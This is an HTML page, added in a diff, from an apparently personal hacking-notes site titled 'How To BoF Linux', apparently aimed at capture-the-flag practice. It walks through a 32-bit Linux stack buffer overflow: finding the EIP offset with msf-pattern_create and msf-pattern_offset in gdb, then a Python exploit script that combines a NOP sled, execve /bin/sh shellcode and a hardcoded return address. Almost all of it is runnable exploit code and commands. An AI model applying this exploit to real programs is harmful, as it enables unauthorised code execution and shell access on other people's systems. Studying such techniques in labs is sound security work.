@@ -1,0 +1,201 @@
+
+
+<!doctype html>
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
+
+    <title>How To BoF Linux &#8212; Documentation 0.1 documentation</title>
+    <link rel="stylesheet" type="text/css" href="../../../_static/pygments.css" />
+    <link rel="stylesheet" type="text/css" href="../../../_static/bizstyle.css" />
+    
+    <script data-url_root="../../../" id="documentation_options" src="../../../_static/documentation_options.js"></script>
+    <script src="../../../_static/jquery.js"></script>
+    <script src="../../../_static/underscore.js"></script>
+    <script src="../../../_static/doctools.js"></script>
+    <script src="../../../_static/bizstyle.js"></script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" />
+    <link rel="next" title="Reverse Shells Home Page" href="../../shells/index.html" />
+    <link rel="prev" title="BoF Home Page" href="../index.html" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <!--[if lt IE 9]>
+    <script src="_static/css3-mediaqueries.js"></script>
+    <![endif]-->
+  </head><body>
+    <div class="related" role="navigation" aria-label="related navigation">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="../../../genindex.html" title="General Index"
+             accesskey="I">index</a></li>
+        <li class="right" >
+          <a href="../../shells/index.html" title="Reverse Shells Home Page"
+             accesskey="N">next</a> |</li>
+        <li class="right" >
+          <a href="../index.html" title="BoF Home Page"
+             accesskey="P">previous</a> |</li>
+        <li class="nav-item nav-item-0"><a href="../../../index.html">Documentation 0.1 documentation</a> &#187;</li>
+          <li class="nav-item nav-item-1"><a href="../../index.html" >Hacking Home Page</a> &#187;</li>
+          <li class="nav-item nav-item-2"><a href="../index.html" accesskey="U">BoF Home Page</a> &#187;</li>
+        <li class="nav-item nav-item-this"><a href="">How To BoF Linux</a></li> 
+      </ul>
+    </div>  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          <div class="body" role="main">
+            
+  <section id="how-to-bof-linux">
+<h1>How To BoF Linux<a class="headerlink" href="#how-to-bof-linux" title="Permalink to this headline">¶</a></h1>
+<section id="find-eip-offset">
+<h2>Find EIP Offset<a class="headerlink" href="#find-eip-offset" title="Permalink to this headline">¶</a></h2>
+<section id="run-msf-patter-create">
+<h3>Run msf-patter_create<a class="headerlink" href="#run-msf-patter-create" title="Permalink to this headline">¶</a></h3>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf-pattern_create -l &lt;random_number&gt;</span>
+<span class="go">msf-pattern_create -l 400</span>
+</pre></div>
+</div>
+</section>
+<section id="start-gdb">
+<h3>Start GDB<a class="headerlink" href="#start-gdb" title="Permalink to this headline">¶</a></h3>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">gdb &lt;file&gt;</span>
+<span class="go">gdb chal</span>
+</pre></div>
+</div>
+</section>
+<section id="feed-msf-patter-create-string-into-program">
+<h3>Feed msf-patter_create string into program<a class="headerlink" href="#feed-msf-patter-create-string-into-program" title="Permalink to this headline">¶</a></h3>
+<p>With this make sure you look for output of EIP.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">r &lt;output of msf-pattern_create&gt;</span>
+</pre></div>
+</div>
+<p>Assuming we ran this command we find this</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">0x316d4130 (&#39;0Am1&#39;)</span>
+</pre></div>
+</div>
+</section>
+<section id="run-msf-patter-offset">
+<h3>Run msf-patter_offset<a class="headerlink" href="#run-msf-patter-offset" title="Permalink to this headline">¶</a></h3>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf-pattern_offset -q &lt;output of EIP&gt;</span>
+<span class="go">msf-pattern_offset -q 0AM1</span>
+</pre></div>
+</div>
+<p>Lets assume you get the output of <cite>Exact match at offset 362</cite>. You then run this in python and copy it in gdb</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">python -c &#39;print(&quot;A&quot;*&lt;number from offset&gt; + &quot;BBBB&quot;)&#39;</span>
+<span class="go">python -c &#39;print(&quot;A&quot;*362 + &quot;BBBB&quot;)&#39;</span>
+
+<span class="go">gdb -q &lt;file&gt;</span>
+
+<span class="go">r &lt;output of python&gt;</span>
+</pre></div>
+</div>
+<p>This should result in EIP looking like this: <cite>$eip   : 0x42424242 (“BBBB”?)</cite></p>
+</section>
+</section>
+<section id="find-address-of-buffer">
+<h2>Find Address of Buffer<a class="headerlink" href="#find-address-of-buffer" title="Permalink to this headline">¶</a></h2>
+<p>Go back to remote shell and run <cite>gdb -q &lt;file&gt;</cite>. Then run <cite>b main</cite>. Run the following</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">r $(python -c &#39;print &quot;A&quot;*400&#39;)</span>
+</pre></div>
+</div>
+<p>Check out the stack</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">x/64xw $esp</span>
+</pre></div>
+</div>
+<p>python3 exploit</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">#</span>!/usr/bin/env python3
+<span class="go">import sys</span>
+<span class="go">offset = 362</span>
+<span class="go">shellcode = b&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&#39;</span>
+<span class="go">nop = b&quot;\x90&quot; * (offset - len(shellcode))</span>
+<span class="go">EIP = b&quot;\x54\xf7\xff\xbf&quot;</span>
+
+<span class="go">payload = nop + shellcode + EIP</span>
+
+<span class="go">sys.stdout.buffer.write(payload)</span>
+</pre></div>
+</div>
+<p>Execute the program with the buffer overflow</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">&lt;bof_program&gt; $(python3 exploit)</span>
+</pre></div>
+</div>
+</section>
+</section>
+
+
+            <div class="clearer"></div>
+          </div>
+        </div>
+      </div>
+      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
+        <div class="sphinxsidebarwrapper">
+  <h3><a href="../../../index.html">Table of Contents</a></h3>
+  <ul>
+<li><a class="reference internal" href="#">How To BoF Linux</a><ul>
+<li><a class="reference internal" href="#find-eip-offset">Find EIP Offset</a><ul>
+<li><a class="reference internal" href="#run-msf-patter-create">Run msf-patter_create</a></li>
+<li><a class="reference internal" href="#start-gdb">Start GDB</a></li>
+<li><a class="reference internal" href="#feed-msf-patter-create-string-into-program">Feed msf-patter_create string into program</a></li>
+<li><a class="reference internal" href="#run-msf-patter-offset">Run msf-patter_offset</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#find-address-of-buffer">Find Address of Buffer</a></li>
+</ul>
+</li>
+</ul>
+
+  <h4>Previous topic</h4>
+  <p class="topless"><a href="../index.html"
+                        title="previous chapter">BoF Home Page</a></p>
+  <h4>Next topic</h4>
+  <p class="topless"><a href="../../shells/index.html"
+                        title="next chapter">Reverse Shells Home Page</a></p>
+  <div role="note" aria-label="source link">
+    <h3>This Page</h3>
+    <ul class="this-page-menu">
+      <li><a href="../../../_sources/hacking/BoF/Linux/BoF-init-sneaky.rst.txt"
+            rel="nofollow">Show Source</a></li>
+    </ul>
+   </div>
+<div id="searchbox" style="display: none" role="search">
+  <h3 id="searchlabel">Quick search</h3>
+    <div class="searchformwrapper">
+    <form class="search" action="../../../search.html" method="get">
+      <input type="text" name="q" aria-labelledby="searchlabel" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"/>
+      <input type="submit" value="Go" />
+    </form>
+    </div>
+</div>
+<script>$('#searchbox').show(0);</script>
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="related" role="navigation" aria-label="related navigation">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="../../../genindex.html" title="General Index"
+             >index</a></li>
+        <li class="right" >
+          <a href="../../shells/index.html" title="Reverse Shells Home Page"
+             >next</a> |</li>
+        <li class="right" >
+          <a href="../index.html" title="BoF Home Page"
+             >previous</a> |</li>
+        <li class="nav-item nav-item-0"><a href="../../../index.html">Documentation 0.1 documentation</a> &#187;</li>
+          <li class="nav-item nav-item-1"><a href="../../index.html" >Hacking Home Page</a> &#187;</li>
+          <li class="nav-item nav-item-2"><a href="../index.html" >BoF Home Page</a> &#187;</li>
+        <li class="nav-item nav-item-this"><a href="">How To BoF Linux</a></li> 
+      </ul>
+    </div>
+    <div class="footer" role="contentinfo">
+        &#169; Copyright 2021, Steven Latino.
+      Created using <a href="https://www.sphinx-doc.org/">Sphinx</a> 4.3.0.
+    </div>
+  </body>
+</html>
